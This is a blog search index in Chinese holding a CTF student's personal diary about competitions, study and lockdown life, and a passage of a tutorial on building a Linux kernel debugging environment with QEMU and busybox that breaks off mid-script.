<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>日志</title>
      <link href="/2099/06/11/%E6%97%A5%E5%BF%97/"/>
      <url>/2099/06/11/%E6%97%A5%E5%BF%97/</url>
      
        <content type="html"><![CDATA[<h1 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h1><span id="more"></span><h3 id="2021-06-11"><a href="#2021-06-11" class="headerlink" title="2021-06-11"></a>2021-06-11</h3><p>学着Brubbish师傅写日记，提升提升额滴文采😀</p><p>博客还是不太熟悉，还有好多想弄的功能不会弄，后期在学吧。</p><p>今儿复习了下house-of-atum，明儿打强网杯，希望能做出题来🙏。</p><h3 id="2021-06-14"><a href="#2021-06-14" class="headerlink" title="2021-06-14"></a>2021-06-14</h3><p>打了两天的强网杯，出来两个pwn，还有一个更多人做出来的pwn我没写出来，主要是到后面就没心思做题了（还是太菜了），脑子都停止思考了😱。</p><p>有妹子给文兄送吃的，属实羡慕😭。</p><p>得抽时间复习功课了，这学期作业就没咋做，挂科就尴尬了。</p><p>接下来这段时间争取把强网杯的每个题复现完，再跟着书继续做例题。</p><h3 id="2021-6-21"><a href="#2021-6-21" class="headerlink" title="2021-6-21"></a>2021-6-21</h3><p>这段时间弄了个数模，全程摸鱼，全靠文兄和杨丝输出。</p><p>今晚啥比了去了个党站活动，尼玛坐了四个小时，打乱了我一天的计划，手机也关机了，鼓起勇气找了个跟白总关系很好的女娃娃（我不认识）让她帮忙给白总说下让实验室别锁门，结果白总以为我玩他，愣是不说，还搞的我跟流氓一样烦别人女娃娃，社死😰。</p><h3 id="2021-6-24"><a href="#2021-6-24" class="headerlink" title="2021-6-24"></a>2021-6-24</h3><p>昨天Gleaf诞生了，做个纪念。</p><p>这几天复习了个寂寞，全程在补这个学期的作业，根本补不完。😨</p><h3 id="2021-6-26"><a href="#2021-6-26" class="headerlink" title="2021-6-26"></a>2021-6-26</h3><p>Gleaf第一战！</p><p><img src="/2099/06/11/%E6%97%A5%E5%BF%97/image-20210627213500222.png" class="lazyload placeholder" data-srcset="/2099/06/11/%E6%97%A5%E5%BF%97/image-20210627213500222.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20210627213500222"></p><p>今儿划了一天的水，pwn一个没出，做了到密码题。。。又是没复习的一天。</p><h3 id="2021-6-27"><a href="#2021-6-27" class="headerlink" title="2021-6-27"></a>2021-6-27</h3><p>先骂自己是个啥比。😀</p><p>昨天的第一个pwn，栈溢出就在我眼前！！！我tm一直盯着MD5加密算法干啥，以为是道密码pwn。。。已经不是第一次犯这个错误了，总是把题目想的太复杂，这是为啥捏。。。</p><h3 id="2021-8-1"><a href="#2021-8-1" class="headerlink" title="2021-8-1"></a>2021-8-1</h3><p>这段时间一直在复习，耽误了很多比赛，不过还好没挂科。</p><p>中间去哈尔滨ciscn总决赛，题目根本不是我这种水平能做出来的，全程在做流量分析，痛苦。</p><p>因为疫情失去了一次去青岛玩的机会，很难受。</p><p>打了场buu上的小比赛，第一次akpwn，纪念下。</p><h3 id="2021-8-4"><a href="#2021-8-4" class="headerlink" title="2021-8-4"></a>2021-8-4</h3><p>这两天在帮四叶草出题，出题可比做题难多了，我一直在网上找怎么出沙箱题，无果。</p><p>感觉回学校学习是没有希望了，早知道不回家呆着了，这一呆又不知道呆到啥时候。</p><p>在家学习的效率还是有点低啊，晚上一两点才睡，早上十一二点起，没事就刷抖音，很颓废。但一个人要想自律还是有点难的，希望现在还在学校学习的小伙伴学慢点吧🙃</p><h3 id="2021-8-6"><a href="#2021-8-6" class="headerlink" title="2021-8-6"></a>2021-8-6</h3><p>早上一觉起来十点半，好绝望，负能量爆满，干瞪着眼睛看着外面的天空，脑袋里却一片空白。昨晚快三点才睡的，回到家两个多星期了，每天如此，实在是很颓废，今天休息一天吧，虽然每天好像都在休息。也不清楚这是负能量导致的想休息，还是想丢弃负能量获得正能量导致的想休息，不管那么多了，一切都顺其自然吧。希望明天做到早睡早起。</p><h3 id="2021-8-7"><a href="#2021-8-7" class="headerlink" title="2021-8-7"></a>2021-8-7</h3><p>昨晚强迫自己十二点半睡的觉，十二点让我爸交教我怎做可乐鸡翅😁，说实话，昨天一天下来也没感觉到自己放松了多少，从三月份开始，发现自己对于游戏，短视频，电影，动漫这些以前最喜欢的东西的兴趣在慢慢降低。所以昨天一天我都在尝试从中找回乐趣，但我没有也找不到好看的动漫（要不就是好看的动漫太长，短时间内根本看不完），也不知道自己要看什么电影，电视剧（估计是觉醒年代刚看完，感觉没有比它更好看的电视剧了），短视频带给我的也只有烦躁。以前一到放暑假寒假，就会跟高中同学或初中同学一起聚聚，现在也没多少人一起出来聚了，要不就是太久没联系，要不就是都有自己的事情（好多都在学校）。</p><p>想想这一个学期，除了每天泡在电脑面前，就没有啥其他的娱乐了。这也导致了我腰酸背痛，所以才不得不每天花花时间打打乒乓球或跑跑步。以前的每个周末都会和同学看看电影或出去干饭，现在这样的次数也少了。都说啥趁年轻放肆嗨，啥现在不疯狂以后就没机会了。我也很同意这些看法，但仅仅是我认为，要疯要嗨的事应该是让自己开心的事，即自己在很多年后想想也会开心并且很有意义的事，而不是之后想想感觉是浪费时间的事。所以我和小伙伴们天天对着电脑，打着比赛，希望能在毕业之前把各个省都跑一遍，这对于我来说便是疯狂的事，也是开心的事。在别人眼里，我估计是个没有闲情雅趣，天天对着电脑的宅男。。。不管了，就写这么多吧。</p><h3 id="2021-8-13"><a href="#2021-8-13" class="headerlink" title="2021-8-13"></a>2021-8-13</h3><p>想了好久也不知道写些什么，除了日复一日的做着些相同的事情（吃饭，睡觉，游戏，复现，锻炼），也就没有什么其他事情了，笑死，连家门也没出过。</p><p>昨天复现了两道不用逆向分析的c++题目，复现到快凌晨两点，收获挺多，还把我的虚拟机整理下，免的做题的时候太乱。不过这几天也在思考，打完ctf后应该做些什么，都是后话了，等到那天来了再说。</p><h3 id="2021-9-21"><a href="#2021-9-21" class="headerlink" title="2021-9-21"></a>2021-9-21</h3><p>一个多月没更新了，发现写日常博客事件很难的事，主要是每次想写日常不知道该如何开始，自己的文笔也限制了博客的更新，我想总不能写一些无聊的、没有记忆点的东西在博客里吧，应该把生活中丰富多彩的事情写进去，这样日后看来才能回忆起来。现实是，根本没有丰富多彩的生活（可能是我没有一双可以发现世间乐趣的眼睛吧），每天平平淡淡的坐在电脑前，一天的时间就过去了。所以决定每天写写一天学到了什么，做个小小的总结，以至于每天都能有点收获。</p><p>昨天硬在床上躺了一天，原因是因为他们都出去玩了，我想着那就给自己放一天假吧，放假本是一件开心的事，奈何一个人久了，也没有想出去玩的心了，最主要的是出去不知道玩啥（这估计就是别人口中的不会玩），所以我就躺着，躺着，躺着。盯着手机看了一天，无非是抖音，虎牙，游戏。一天下来啥也没学到，还感觉到自己浪费了很多时间。发现快乐是对比出来的，你只有先经历过痛苦，才能感觉到快乐，如果你一直快乐，emmm，嗑药了才会有这种感觉。只有在学习了一天以后，感觉到腰酸背疼，这时候去打打球，舒服的一批。</p><p>刚刚问了Mr.r师傅第五空间的虚拟机的题是咋做的，他说硬调呗，于是开始了我调试之路。。。。</p><h3 id="2021-9-22"><a href="#2021-9-22" class="headerlink" title="2021-9-22"></a>2021-9-22</h3><p>学会了ida动调加pwntools输入，这应该是最基础的，我却现在才学会，调试了会虚拟机发现还是有点太复杂，等过段时间再试试。今儿复习了fini_array的无限写操作，静态pwn的秘笈！</p><h3 id="2021-9-23"><a href="#2021-9-23" class="headerlink" title="2021-9-23"></a>2021-9-23</h3><p>做了pwnable.tw的dubblesort这一题，了解了scanf（‘%u或%d’）时单独输入‘+’或‘-’可以不改变栈中的值。</p><h3 id="2021-9-24"><a href="#2021-9-24" class="headerlink" title="2021-9-24"></a>2021-9-24</h3><p>做了个wireshark抓包实验，晚上下了暴雨，直接回宿舍躺倒。。。又是不想学习的一天。</p><h3 id="2021-9-25"><a href="#2021-9-25" class="headerlink" title="2021-9-25"></a>2021-9-25</h3><p>晚上接到电话说进了长城杯决赛，原因是前面的大佬们都不愿意去，给的奖金太少了。那么10.10第五空间在天津打完就得跑去北京打长城杯（<del>去给大佬们当沙袋</del>）。</p><p>学到了readelf -S libc可以看libc的各个段的偏移，<del>emmmm一直以为所有libc的段间距都是一样的</del>。</p><h3 id="2021-10-1"><a href="#2021-10-1" class="headerlink" title="2021-10-1"></a>2021-10-1</h3><p>今天出去捣了会台球有点上瘾，虽然有点菜。今天学了一个tcache_stashing_unlink_attack,他就是当tcache没有满时，从fastbin或smallbin中取chunk时，如果fastbin或smallbin中还有剩余chunk，就会将这些chunk放入tcahe中直至tcache被插满，利用这个过程中的漏洞来修改任意地址的值（main_arena的值），如果修改了global_max_fast，且可以free的chunk的大小很大时，我们就可以计算目标地址到fastbin基地址的偏移来进行任意地址的写操作。</p><h3 id="2021-10-5"><a href="#2021-10-5" class="headerlink" title="2021-10-5"></a>2021-10-5</h3><p>也许只有一个人的时候，才会真正思考一些东西吧。我在想为什么我的状态越来越差，为什么和爸妈的关系有点僵，甚至是为什么一直单身（<del>emmmm</del>）。</p><p>我一直用今年3月-五月那个时候的状态去和现在比较，因为那个阶段是我感觉我进步最快的阶段，每天都能学到很多新的东西，而现在感觉自己学什么都很慢，学的慢了我就会产生不好情绪。所以我到底在恐慌什么，那个时候学到新东西很快是因为学的都很简单加上自己什么也不懂，肯定学的快，现在没什么提升是因为很多东西很难需要慢慢的消化吸收。自己到底在焦虑什么了，是感觉到自己的平庸了吗，还是觉得离自己的目标越来越远？不管了，还是静下心来慢慢的学，慢慢的积累，慢慢的质变！</p><h3 id="2021-11-21"><a href="#2021-11-21" class="headerlink" title="2021-11-21"></a>2021-11-21</h3><p>emmmm,快一个多月没写了，并不是没有发生什么，而是发生了太多的事情。第一次和一群校外的大佬们打比赛，第一次在短短两天的时间内奔波三个城市，第一次拿到属于自己的奖金，第一次去看了天安门，第一次见识了三楼的牛排等等等等。也有挺多的遗憾，没有拿到属于我们的第一个奖杯，没有和fmyyy吃到地道的北京烤鸭，没有去探望玩的很好的初高中同学……</p><p>总的来说，这段时间自我感觉进步了不少，能够静下心来去分析很长很长的代码。但也越来越感觉到时间的紧迫，多想现在是大二，有充足的时间去和师傅们征战沙场（<del>白日做梦罢了</del>）。</p><p>今天突然感觉到有点绝望，原因是有很多没有完成的事在今天聚一块了。想要把这件事先完成但又感觉先把另一件事做完更好，以至于什么事情都不想做了。考研，就业，ctf这三座大山也都来到了我的面前，我必须要抉择去爬哪一座大山，但我很贪心，一直在想一个即不耽误考研又不耽误打比赛的办法。</p><p>总之，还是慢慢来吧，不要急，不能自乱阵脚，放下浮躁。</p><h3 id="2021-11-22"><a href="#2021-11-22" class="headerlink" title="2021-11-22"></a>2021-11-22</h3><p>昨晚刷抖音时刷到一个很有意思的视频，视频主题说的是每天的审视自己，才不会随波逐流，然后推荐了一个叫 “普鲁斯特问卷”的问卷。我点开了评论区，看到了这28个问题。</p><ul><li>你认为最完美的快乐是怎样的？一家人其乐融融的画面就显示在了我的脑海里，当一个家庭不受经济上的困扰恐怕才是最完美的快乐吧。拓展开来，第一，怎样才能不受经济上的困扰？恐怕得有一份自己愿意付出时间的工作。怎样自己才愿意付出时间？就我而言，一定得是自己感兴趣的事情，我才愿意付出时间去研究它思考他。第二，怎样才能拥有一个其乐融融的家庭？夫妻二人一定要有感情基础，相信一见钟情，但更偏向于日久生情。怎样具有感情基础？双向奔赴，精神共鸣，互相欣赏，互相理解。因此，在工作中获得精神上的满足后，回家给妻儿带些”小惊喜“，听着他们的笑声就能治愈身体和精神上的疲惫，就是最完美的快乐。</li><li>你最希望拥有哪种才华？拥有超高的情商。我一直坚信情商是决定你高度的一个东西，站在情商的制高点上，能避免很多小烦恼。</li><li>你最恐惧的是什么？昨晚看到这时想了很久也没有一个合适的答案。因为恐惧的有很多，比如自己的父母，自己的爱人，自己的朋友，自己的目标和志向等等，但其实都并不是最恐惧的。就在码这些字的时候，我突然明白了，自己最恐惧的不就是自己的存在吗。假如连自己都不存在了，一切我想参与的美好也都没了。也许现在我并没有遇到什么比生命还珍贵的东西，但在以后，我一定也能理解古人说的那种比生命还珍贵的东西。也许这就是这个问卷的意义，每天的审视自己，观察自己的变化，了解自己到底想要什么。</li></ul><h3 id="2021-11-23"><a href="#2021-11-23" class="headerlink" title="2021-11-23"></a>2021-11-23</h3><ul><li>你目前的心境怎样？乱，乱的一批。</li><li>还在世的人中你最钦佩的是谁？是一个打ctf的大佬，牛的一批，而且问问题也很乐意给我解答一点架子都没。</li><li>你认为自己最伟大的成就是什么？现在就任于网络安全协会会长，虽然是个兴趣社团，但发现管理起来是真的难！</li></ul><h3 id="2021-11-26"><a href="#2021-11-26" class="headerlink" title="2021-11-26"></a>2021-11-26</h3><p>woc?!我记得只有昨天没写，怎么一看日期发现过了两天了？？？那我前天在干嘛？？？</p><ul><li>你自己的哪个特点让你最觉得痛恨？当然就是自己把握不住说话的那个分寸，确实，从小到大说话不经过脑子，每次都是嘴上说完，回想起来觉得不对味但是已经晚了。</li><li>你最喜欢的旅行是哪一次？那肯定是今年六月份和学长们去甘肃打比赛的那次，吴昊老师安排的住宿伙食路线都很好加上两个队都进了决赛，所以就玩的很开心。</li><li>你最痛恨别人的什么特点？与其说痛恨别人什么特点，还不如说自己最讨厌什么，那肯定就是自以为是了，总感觉老子天下无敌的人实在是受不了。</li></ul><h3 id="2021-12-18"><a href="#2021-12-18" class="headerlink" title="2021-12-18"></a>2021-12-18</h3><p>12月打了两场线下赛，一场安洵杯一场赣网杯，一个二等奖一个三等奖，只想说出去一趟真不容易，见到了很多师傅，也见识了社会的险恶，司机坐地起价，比赛存在内定。不过玩的还是很开心的。</p><p>现在整个人的状态就是不知道做什么，因为是准备考研了，但国赛又想冲一下，所以是想着每天还留两三个小时玩电脑。想法是好的，但感觉对考研提不起来兴趣，就是突然感觉时间充裕了起来，但客观来说时间是非常紧缺的 ，所以我既不想浪费时间，但就是不知道该做什么，给自己留了学习英语的时间，但是一看到那些看不懂的句子我就想睡觉玩手机。。。太难了。考研这条路真的适合自己嘛。</p><h3 id="2021-12-22"><a href="#2021-12-22" class="headerlink" title="2021-12-22"></a>2021-12-22</h3><p>疫情这个东西来的太突然了，两天前听说长安大学出来两例，那时我们还在线下上课，昨天就突然转线上了，然后在实验室体验了一天线上上课的感觉，今早又被通知全部回宿舍，在宿舍进行隔离。不知道今年的新年还能回家过嘛。希望所有人都平平安安！</p><h3 id="2022-3-3"><a href="#2022-3-3" class="headerlink" title="2022-3-3"></a>2022-3-3</h3><p><strong>唉</strong>，这个字表示了我这段时间停更的状态，也证明我还活着在。从疫情开始到现在已经两个多月了，在这两个月里应该算是我最黑暗的两个月，作息不规律+不运动使我的抵抗力急速下降，在临近开学的时候先换上了带状疱疹，紧接着肾里又多出来个结石。这两个月过的实在是太安逸了，而太过安逸的背后必定隐藏着大的凶险。两个多月没有认认真真的学习过了，虽然中途有些比赛还是参加了的，但和在学校学习的效率来看这两个月就相当于是白活了。姑且知识没有学到也就罢了，其他任何的东西也是一样没学。因为这两个月网络游戏占了我全部的时间，带给我的也只有糟糕的状态和疲惫不堪的身体。</p><p>突然就想到了现在自己这个状态就跟高二高三的那个状态一样，天天在想该怎么做，却一直也没怎么做过。所以就会打击自己的自信心，让自己出现懈怠的情绪。应证了那句“思而不学则殆”，所以，the more you think，the less you do。过两天就要开学了，ctf就先放一放吧，卷考研去喽（qidao）。</p><h3 id="2022-6-19"><a href="#2022-6-19" class="headerlink" title="2022-6-19"></a>2022-6-19</h3><p>昨天刚打完西北分区赛，考研也快白热化阶段，是该写些啥了来记录一下最近的心境。</p><p>从ciscn2022初赛到昨天刚结束的分区赛，有一个很明显的感受就是越来越卷了，初赛的第一个写shellcode的题很不错，考察了点代码分析的能力，有点webpwn的味道。llvmpwn也很不错，让我坐牢做了一天。但堆题就很emmmmmm（<del>分区赛两个堆题，初赛一个</del>）。首先共同特点就是无脑往高版本libc靠，漏洞点太明显，就是考察如何构造堆块去绕过高版本libc的检查机制。以前我是挺喜欢这些题的，但估计是我快半年没碰ctf的原因，对这些题已经没有以前更熟练了。分区赛的pwn题就感觉是为了提高难度都开了沙箱，真的很折磨人（<del>还是自己太菜，做不来这些</del>）。</p><p>关于考研，算了，写到这就没啥想说的了，以后再说吧。</p><h3 id="2022-7-28"><a href="#2022-7-28" class="headerlink" title="2022-7-28"></a>2022-7-28</h3><p>坐在回家的高铁上，闲来无事，想写点也该写点这段时间复习的感受了。</p><p>真的，如果没有很大的决心，那么考研的过程就会很艰难，绝不仅仅是知识的难度而已，事实上，相对来说，知识的难度也仅仅占一小部分而已，最难的是你可以把控住以及调整好自己的状态。第一是身体 状态，一天一半的时间坐在图书馆，身体肯定是吃不消的，因为缺乏锻炼生了好几次病，一病恢复到最佳的状态就需要三四天，哪有那么多个三四天呢。第二是精神状态，必须要找到无数个能给你充能的理由去抗衡那无数个想要让你放弃的理由。</p><p>刚得知国赛总决赛改为线上，呵呵呵，可惜了，这狗日的疫情夺走了我多少走出去的机会，希望疫情早日结束。</p><h3 id="2022-9-19"><a href="#2022-9-19" class="headerlink" title="2022-9-19"></a>2022-9-19</h3><p>离考研仅剩97天了，但偏偏在这个关键时刻学校又封闭图书馆，甚至连东西区都不能流动，不对，是只限制学生不能流动。老师和其他工作人员，似乎是除了学生之外都可以随意在校内流动。学校这样的操作我也不是第一次见了。</p><p>今天是已经是封校的第六天了，还要封校六天别人我不太清楚，反正对于我来说是真的不知道该如何在宿舍的床上学习了（又要开始说这垃圾学校住的还是上下铺）。都说三等人抱怨环境，二等人适应环境，一等人创造环境。我一直是非常不愿意做三等人的，但学校已经把我逼成了三等人，我已经试过利用学校喜欢做表面工作这一漏洞，将自己的学习环境变为在东区的实验室学习，但没想到学校这么喜欢把工作做到极致，只要是学生就禁止你乱跑，好好待在宿舍发呆。因为我们学院已经全部搬到东区去了，所以西区已经没有学院的地方了，教学楼和他们说的能学习的地方学校也都禁止去了。也试过找到一个尽量能让自己舒服的位置和姿势去学习，奈何无论是坐床上，还是趴在床上一会时间就已经腰酸背疼，很难将自己的注意力放在学习上（也怪自己的定力不够）。我一直认为学校是一个让学生争做一等人的地方，可我没想到，我已经变成了自己最讨厌的三等人。</p><p>我一直认为如果不能高效的学习，那还不如去放松放松，调整好自己的状态再学学习。但我已经很多天没有学习了，现在就是，有一颗很想学的心，但又总是被分心，时间又越来越紧，自己又越来越焦虑，越焦虑状态就越不好，状态越不好就越学不下去。我到底该怎么办呢？？？</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>kernel初探</title>
      <link href="/2023/01/18/kernel%E5%88%9D%E6%8E%A2/"/>
      <url>/2023/01/18/kernel%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="kernel初探"><a href="#kernel初探" class="headerlink" title="kernel初探"></a>kernel初探</h2><span id="more"></span><h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>前年（2021.12）封宿舍的时候，闲来无聊，准备入门kernel了，但貌似是因为环境总是出问题，就转去学习异构pwn了。如今，在家荒废了三周，实在是无聊至极，又开始准备kernel的环境，但貌似一下子就成功了，记录一下，为以后查阅准备。</p><p>2023.1.24补充：之前配好的环境是在ubuntu16上，在调试驱动的时候出现了问题，gdb版本太低，需要升级gdb，两种方法，一种是更改gdb源码但我在ubuntu16上没有找到可以改源码的地方，第二种是直接编译新的gdb但一直没升级成功（<del>菜</del>）。于是我在ubuntu22.04上重新配置，所以会在配置环境的过程中添加些新的问题。</p><h3 id="内核下载和编译"><a href="#内核下载和编译" class="headerlink" title="内核下载和编译"></a>内核下载和编译</h3><p>根据wiki给的<a href="https://www.kernel.org/">内核下载网站</a>，将其解压。</p><p>解压命令</p><ul><li><code>unxz linux-5.4.98.tar.xz</code></li><li><code>tar -xf linux-5.4.98.tar </code></li></ul><blockquote><p>须提前安装libncurses-dev、flex、bison</p><p>如apt-get install libncurses-dev</p></blockquote><p>进入linux-5.4.98目录利用<code>make menuconfig</code>配置内核编译选项，配置时进入 Kernel hacking -&gt; Compile-time checks and compiler options 勾选 Compile the kernel with debug info ，便于后续调试。</p><blockquote><p>安装libelf-devel、dwarves </p></blockquote><p>接着在linux-5.4.98目录下使用<code>make -j3 bzImage</code>命令编译内核镜像。见到下图所示的提示即为编译成功。</p><p><img src="/2023/01/18/kernel%E5%88%9D%E6%8E%A2/image-20230129173119928.png" class="lazyload placeholder" data-srcset="/2023/01/18/kernel%E5%88%9D%E6%8E%A2/image-20230129173119928.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230129173119928"></p><h3 id="构建文件系统"><a href="#构建文件系统" class="headerlink" title="构建文件系统"></a>构建文件系统</h3><p>下载并解压busybox</p><ul><li><p><code>wget https://busybox.net/downloads/busybox-1.32.1.tar.bz2</code></p></li><li><p><code>tar -jxf busybox-1.32.1.tar.bz2 </code></p></li></ul><p>配置： 在 Setttings 选中 Build static binary (no shared libs)，将 busybox 编译为静态链接的文件；在 Linux System Utilities 中取消选中 Support mounting NFS file systems on Linux &lt; 2.6.23 (NEW)；在 Networking Utilities 中取消选中 inetd。 </p><ul><li><code>make menuconfig</code></li></ul><p>编译</p><ul><li><code>make -j3</code></li></ul><p>进入解压后的busybox-1.32.1目录，利用<code>make install</code>创建_install目录（作为 rootfs ），进入_install目录利用<code>mkdir -p  proc sys dev etc/init.d</code>命令创建文件夹，并编写文件名为init的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo &quot;INIT SCRIPT&quot;</span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">echo -e &quot;Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br></pre></td></tr></table></figure><p>给脚本添加执行权限，并将_install目录打包为rootfs.img</p><ul><li><p><code>chmod +x ./init</code></p></li><li><p><code>find . | cpio -o --format=newc &gt; ../../rootfs.img</code>打包</p></li><li><p><code>cpio -idmv &lt; rootfs.img</code>解包（此处命令不需要）</p></li></ul><p><strong>至于busybox的作用，除了构建文件系统外，其他的作用我暂时还不清楚，待后续的深入学习后，再来补充。</strong></p><h3 id="文件组成"><a href="#文件组成" class="headerlink" title="文件组成"></a>文件组成</h3><ul><li>baby.ko是包含漏洞的程序，一般使用ida打开分析,可以根据init文件的路径去rootfs.cpio里面找</li><li>bzImage<br>bzImage是打包的内核代码，一般通过它抽取出vmlinx,寻找gadget也是在这里。</li><li>initramfs.cpio<br>initramfs.cpio是内核采用的文件系统</li><li>startvm.sh<br>startvm.sh是启动QEMU的脚本</li><li>vmlinux<br>静态编译，未压缩的内核文件，可以在里面找ROP</li><li>init文件<br>在rootfs.cpio文件解压可以看到，记录了系统初始化时的操作，一般在文件里insmod一个内核模块.ko文件，通常是有漏洞的文件<br>.ko文件：需要拖到IDA里面分析找漏洞的文件，</li></ul><h3 id="启动内核"><a href="#启动内核" class="headerlink" title="启动内核"></a>启动内核</h3><p>wiki上给的脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr&quot; \</span><br><span class="line">    -smp cores=2,threads=1 \</span><br><span class="line">    -cpu kvm64</span><br></pre></td></tr></table></figure><p>参数解释如下：</p><ul><li>-m， 指定 RAM 大小，默认 384M</li><li>-kernel，指定内核镜像文件 bzImage 路径</li><li>-initrd，设置内核启动的内存文件系统</li><li><code>-smp [cpus=]n[,cores=cores][,threads=threads][,dies=dies][,sockets=sockets][,maxcpus=maxcpus]</code>，指定使用到的核数。</li><li>-cpu，指定指定要模拟的处理器架构，可以同时开启一些保护，如<ul><li>+smap，开启 smap 保护</li><li>+smep，开启 smep 保护</li></ul></li><li>-nographic，表示不需要图形界面</li><li>-monitor，对 qemu 提供的控制台进行重定向，如果没有设置的话，可以直接进入控制台。</li><li>-append，附加选项<ul><li><code>nokaslr</code> 关闭随机偏移</li><li><strong>console=ttyS0，和 <code>nographic</code> 一起使用，启动的界面就变成了当前终端。</strong></li></ul></li></ul><p>也可以利用如下脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -kernel ./arch/x86/boot/bzImage \  #bzImage 路径</span><br><span class="line">  -initrd ./rootfs.img \             #文件系统路径</span><br><span class="line">  -append &quot;console=ttyS0 nokaslr&quot;</span><br><span class="line">  -nographic</span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -kernel ../linux-5.4.98/linux-5.4.98/arch/x86/boot/bzImage -initrd ./rootfs.img -append &quot;console=ttyS0 nokaslr&quot; -nographic -gdb tcp::1234</span><br></pre></td></tr></table></figure><h3 id="驱动编写调试与加载"><a href="#驱动编写调试与加载" class="headerlink" title="驱动编写调试与加载"></a>驱动编写调试与加载</h3><p>驱动代码如下，为.c文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;linux/init.h&gt;</span><br><span class="line">#include &lt;linux/module.h&gt;</span><br><span class="line">#include &lt;linux/kernel.h&gt;</span><br><span class="line">MODULE_LICENSE(&quot;Dual BSD/GPL&quot;);</span><br><span class="line">static int ko_test_init(void) </span><br><span class="line">&#123;</span><br><span class="line">    printk(&quot;This is a test ko!\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">static void ko_test_exit(void) </span><br><span class="line">&#123;</span><br><span class="line">    printk(&quot;Bye Bye~\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">module_init(ko_test_init);</span><br><span class="line">module_exit(ko_test_exit);</span><br></pre></td></tr></table></figure><p>同一目录下编写Makefile：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#要与驱动.c文件同名即first_kerneltest.c</span><br><span class="line">obj-m += first_kerneltest.o</span><br><span class="line">#内核目录</span><br><span class="line">KDIR =/home/f1ag/Desktop/kernel/linux-5.4.98/linux-5.4.98/</span><br><span class="line">#将空格换成tab</span><br><span class="line">all:</span><br><span class="line">$(MAKE) -C $(KDIR) M=$(PWD) modules</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">rm -rf *.o *.ko *.mod.* *.symvers *.order</span><br></pre></td></tr></table></figure><p>这里简单介绍一下这个 Makefile</p><ul><li><p><code>obj-m</code> 指定要声称哪些模块</p></li><li><p><code>KDIR</code> 用来标识内核源码目录，提供驱动编译所需环境</p></li><li><p><code>$(MAKE) -C $(KDIR) M=$(PWD) modules</code></p></li><li><p><code>-C</code> 表示进入到指定的内核目录</p><ul><li><code>M</code> 指定驱动源码的环境，M 并不是 Makefile 的选项，而是内核根目录下 Makefile 中使用的变量。这会使得该 Makefile 在构造模块之前返回到 M 指定的目录，并在指定的目录中生成驱动模块。</li></ul></li></ul><p>最后<code>make</code>编译驱动即可。</p><p><strong>加载驱动</strong></p><p>将生成的.ko文件复制到busybox的_install目录下并对init（启动脚本）修改如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo &quot;INIT SCRIPT&quot;</span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">insmod /first_kerneltest.ko #新增</span><br><span class="line">echo -e &quot;Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) 